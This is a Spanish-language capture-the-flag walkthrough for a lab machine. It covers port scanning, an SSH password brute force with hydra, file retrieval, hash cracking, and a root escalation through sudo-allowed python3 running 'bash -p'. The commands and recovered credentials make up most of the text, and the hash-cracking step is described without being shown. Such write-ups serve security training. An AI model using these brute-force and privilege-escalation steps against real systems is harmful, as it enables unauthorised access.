# Pequeñas_Mentirosas

## 1. Reconocimiento de Puertos con Nmap

Realizamos un escaneo con `nmap` para detectar puertos abiertos y sus versiones. 

```bash
nmap -sC -sV --open <IP_DEL_OBJETIVO>
```

**Resultados Clave:**

*   `22/tcp open ssh OpenSSH 9.2p1 Debian`
*   `80/tcp open http Apache httpd 2.4.62 ((Debian))

## 2. Enumeración Web y Pista Inicial

Al acceder a la dirección IP del objetivo en un navegador web, la página muestra una pista importante.

### 2.1. Pista en la Página Web

La página web contiene el mensaje: "Pista: Encuentra la clave para A en los archivos.". Esto sugiere que hay un usuario llamado "A" y que su clave (probablemente una contraseña o clave SSH) está oculta en algún archivo del sistema.

### 2.2. Búsqueda de Directorios (Gobuster)

Aunque la pista es clara, siempre es buena práctica realizar una enumeración de directorios con herramientas como `gobuster` para descubrir posibles rutas ocultas o archivos interesantes en el servidor web.

```bash
gobuster dir http://<IP_DEL_OBJETIVO>/ -w /path/to/wordlist/directory-list-2.3-medium.txt -x html,php
```

En este caso, la enumeración de directorios no revela nada directamente útil para la clave de "A", lo que nos redirige a la pista de los archivos.

## 3. Acceso Inicial (SSH)

La pista "Encuentra la clave para A en los archivos" y el puerto SSH abierto nos llevan a intentar un acceso SSH. A menudo, en CTFs, los nombres de usuario simples como letras o nombres comunes son los primeros a probar.

### 3.1. Fuerza Bruta SSH para el Usuario "a"

Intentamos un ataque de fuerza bruta contra el usuario `a` en el servicio SSH. Esto se hace para ver si una contraseña común o una de un diccionario puede funcionar.

```bash
hydra -l a -P /path/to/wordlist/rockyou.txt ssh://<IP_DEL_OBJETIVO>
```

**Resultado :**

*   `[22][ssh] host: <IP_DEL_OBJETIVO> login: a password: secret`

### 3.2. Conexión SSH como "a"

Con las credenciales obtenidas, nos conectamos al servidor SSH como el usuario `a`.

```bash
ssh a@<IP_DEL_OBJETIVO>
# Contraseña: secret
```

## 4. Movimiento Lateral y Descubrimiento de Pistas

Una vez dentro como el usuario `a`, necesitamos buscar más información para escalar privilegios o movernos lateralmente a otros usuarios.

### 4.1. Enumeración de Usuarios y Directorios Home

Exploramos el directorio `/home/` para identificar otros usuarios en el sistema. Esto nos revela la existencia de dos usuarios: `a` y `spencer`.

```bash
ls /home/
# a spencer
```

### 4.2. Búsqueda de Archivos en `/srv/ftp`

La pista inicial mencionaba "archivos". En sistemas Linux, el directorio `/srv` a menudo se utiliza para datos de servicios, como FTP. Aunque no vimos un servicio FTP en el escaneo inicial, es un lugar común para dejar archivos en CTFs.

Descargamos el contenido del directorio `/srv/ftp/` a nuestra máquina atacante usando `scp`.

```bash
scp a@<IP_DEL_OBJETIVO>:/srv/ftp/* ~/Pequenas_mentirosas
```

**Archivos Descargados y su Contenido:**

*   `clave_secreta.txt`: Contiene "Clave secreta: thisisaverysecretkey!". Esta es una clave, pero no está claro para qué es aún.
*   `mensaje_hash.txt`: Contiene "Descubre el hash y tendrás la clave...". Esto sugiere que hay un hash que debemos crackear.
*   `pista_fuerza_bruta.txt`: Contiene "Realiza un ataque de fuerza bruta para descubrir la contraseña de spencer...". Esta es una pista directa para el usuario `spencer`.
*   `retos.txt`: Contiene "Cifrado Simétrico: Usa AES para desencriptar el siguiente archivo.". Esto podría ser un reto adicional.
*   `retos_asimetricos`: Contiene "Cifrado Asimétrico: Encuentra la clave privada para desencriptar.". Otro reto.

### 4.3. Cracking de Hash para el Usuario Spencer

La pista nos indica que debemos crackear un hash para `spencer`. Utilizando una herramienta como `john` o `hashcat` con el hash de `spencer` y un diccionario, obtenemos la contraseña.

**Resultado Clave:**

*   `hash_spencer.txt: password1`

La contraseña para `spencer` es **password1**.

### 4.4. Conexión SSH como Spencer

Con las credenciales de `spencer`, nos conectamos al servidor SSH.

```bash
ssh spencer@<IP_DEL_OBJETIVO>
# Contraseña: password1
```

## 5. Escalada de Privilegios

Una vez que hemos obtenido acceso SSH como el usuario `spencer`, el objetivo es escalar privilegios a `root`.

### 5.1. Verificación de Permisos Sudo

Verificamos qué comandos puede ejecutar el usuario `spencer` con `sudo` sin necesidad de contraseña. Esto se hace con el comando `sudo -l`.

```bash
sudo -l
```

**Resultados Clave:**

*   `User spencer may run the following commands on ...: (ALL) NOPASSWD: /usr/bin/python3`

### 5.2. Obtención de Shell de Root con Python

`python3` puede ser abusado para obtener un shell de `root`. Consultamos [GTFOBins](https://gtfobins.github.io/gtfobins/python/#sudo) para la técnica específica.

Creamos un pequeño script de Python (`exploit.py`) que ejecutará un shell de bash con privilegios de `root`.

```bash
touch exploit.py
echo -e "import os\nos.system(\"bash -p\")" > exploit.py
```

Luego, ejecutamos este script con `sudo` como `root`.

```bash
sudo -u root /usr/bin/python3 exploit.py
```

El comando `whoami` confirmará que hemos escalado exitosamente a `root`.

```bash
whoami
# root
```
